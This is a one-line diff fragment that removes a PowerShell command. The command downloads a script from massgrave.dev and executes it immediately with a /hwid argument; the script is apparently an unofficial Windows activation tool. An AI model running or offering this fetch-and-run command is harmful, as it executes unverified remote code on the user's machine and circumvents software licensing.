@@ -1,1 +1,0 @@
-& ([ScriptBlock]::Create((irm https://massgrave.dev/get))) /hwid
